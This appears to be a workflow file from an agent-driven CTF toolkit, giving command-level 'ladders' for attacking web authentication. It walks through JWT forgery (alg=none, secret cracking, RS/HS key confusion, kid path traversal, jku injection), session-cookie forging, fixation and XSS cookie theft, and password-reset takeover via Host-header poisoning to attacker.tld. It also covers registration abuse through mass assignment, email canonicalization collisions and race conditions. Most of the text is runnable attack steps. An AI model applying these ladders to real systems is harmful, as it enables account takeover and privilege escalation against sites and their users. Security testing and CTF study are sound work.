# Workflows — the four canonical runs

The repeatable sequences. `workflow.md` is the overview; this file is the
command-level detail for the four highest-yield runs.

---

## 1. The JWT ladder — the 8-step ordered attack

```bash
# 0. get the token — login, or capture from a challenge response
T='eyJ...'

# 1. decode — what's in it
python3 tools/web/session_dissect.py --token "$T"

# 2. alg=none — the 5-second test
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''
# hand variant: strip sig, keep trailing dot → replay

# 3. weak secret — offline crack
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist secrets.txt
# if cracked: jwt_forge --secret <found>

# 4. RS→HS confusion — needs pubkey
curl -s "$BASE/jwks.json" > jwks.json  # or /oauth/jwks, /.well-known/
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem

# 5. kid traversal — header has kid?
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''
python3 tools/web/jwt_forge.py --token "$T" --kid /proc/sys/kernel/randomize_va_space --kid-secret '2'

# 6. jku — header has jku or you control the fetch?
python3 tools/web/jwt_forge.py --token "$T" --jku "https://you/jwks.json"

# 7. claim-side — decode showed aud/iss/sub mismatches
python3 tools/web/jwt_forge.py --token "$T" --claims '{"sub":"admin","aud":"target","iss":"idp","exp":9999999999}'

# 8. REPLAY the winner on a protected endpoint
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/admin" --header "Authorization: Bearer $FORGED" \
  --evidence-regex '"role"\s*:\s*"admin"|flag\{' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

Each step is one probe; each dead end is a recorded negative, not a
retry.

## 2. The session-cookie ladder — 6 steps

```bash
# 0. login, capture Set-Cookie
C='session=eyJ...'

# 1. identify the format
python3 tools/web/session_dissect.py --cookie "$C"

# 2. if flask/django/rails/laravel signed blob:
python3 tools/web/session_dissect.py --cookie "$C" --try-keys --wordlist secrets.txt
# leak the key from .env/config/git → forge the session dict
#   e.g. {"_user_id": 1} for flask, {"user_id": 1} for express-session

# 3. if opaque id:
python3 tools/web/session_dissect.py --cookie "$C"
# check entropy table in session-analysis.md
#   sequential → id_sweep
#   md5(sha1(user)) → recompute
#   uuid v1 → predict from timestamp

# 4. fixation path — does the app accept a client-supplied sid?
curl -i "$BASE/login?sid=EVIL"   # does Set-Cookie echo EVIL?
#   if yes → plant the link

# 5. hijack path — HttpOnly missing? XSS exists?
#   steal document.cookie → replay

# 6. REPLAY
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/api/me" --header "Cookie: $C" \
  --evidence-regex '"role"\s*:\s*"admin"|"user"\s*:\s*"admin"' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

## 3. The password-reset ladder — 7 steps

```bash
# 1. trigger /forgot for a controlled account — capture the token
POST /forgot {email:mine@t.tld} → link https://t/reset?token=T

# 2. token analysis — sequential? timestamp? md5(email)? md5(time)?
python3 tools/web/session_dissect.py --token "$T"

# 3. binding — is the token bound to the email?
POST /reset {token:T_victim, email:mine@t.tld, password:new}
#   if this resets MINE using the VICTIM's token → unbound → ATO

# 4. param pollution — send both emails
POST /forgot {email:victim@t.tld,email:mine@t.tld}
#   does the link go to mine@ but token for victim@?

# 5. Host header — does the reset URL use the Host?
POST /forgot {email:victim@t.tld} + Host: attacker.tld
#   does the link become https://attacker.tld/reset?token=T?
#   victim clicks → you read the token from access log

# 6. Referer leak — does /reset?token=T load external resources?
#   the Referer to the tracker carries the token

# 7. replay the token → login → flag
```

## 4. The registration-abuse ladder — 6 steps

```bash
# 1. baseline — register a normal user, read the response
POST /register {u,p,e} → {"id":42,"role":"user"}

# 2. field injection — add every privileged field name
POST /register {u,p,e,role:"admin",isAdmin:true,admin:true,is_admin:true,...}
#   which field wins? check /api/me

# 3. mass-assign on update — if registration sanitizes
POST /profile {role:"admin"}  # or PUT /me
GET /api/me → {"role":"admin"}?

# 4. email tricks — case, plus, dots, unicode
POST /register {email:"VICTIM@t.tld"}   # case collision?
POST /register {email:"victim+tag@t.tld"} # plus-normalized?
POST /register {email:"victim.@t.tld"}    # trailing dot?
POST /register {email:"victim.@t.tld"}    # leading?
POST /register {email:"victim@t.tld."}    # trailing TLD dot?
POST /register {email:"victim@t.tld%00"}  # null?
POST /register {email:"victim@t.tld "}    # trailing space?
#   does the app canonicalize? does the canonical match victim's?

# 5. race — parallel registrations on the same canonical email
python3 tools/web/race_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/register" --body '{"email":"victim@t.tld","password":"x","username":"a"}' \
  --write-ack
#   both succeed → session confusion

# 6. verify-bypass — does the account work without verifying?
#   register → don't click link → login → does it work?
```

## 5. The ledger writes

Every step's verdict goes through `tools/hooks.py post-probe` — a
`confirms` needs `--response` verbatim and `--evidence` that's a
substring. Every dead step gets `--verdict refutes` with the negative —
that negative is the memory that stops the next agent from re-walking
the branch.

The four ladders are ordered by *expected* yield for CTF — JWT > session
> reset > registration — but the real order is the order `decide.py`
names from the signals on disk.
